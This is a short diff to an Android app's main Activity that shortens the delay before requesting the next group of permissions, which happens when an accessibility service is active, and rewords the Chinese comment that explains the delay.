@@ -515,12 +515,12 @@ public class ActivMain extends Activity {
                         permissionDeniedCount.put(perm, count + 1);
                     }
                 }
-                // 延迟请求下一组权限，等待无障碍服务稳定
+                // 延迟请求下一组权限，等待上一组弹窗动画关闭
                 new android.os.Handler(getMainLooper()).postDelayed(() -> {
                     if (MyAccessibilityService.P() != null) {
                         requestNextPermissionGroup();
                     }
-                }, 1500);
+                }, 500);
                 break;
 
             case REQUEST_NOTIFICATION: // 1014
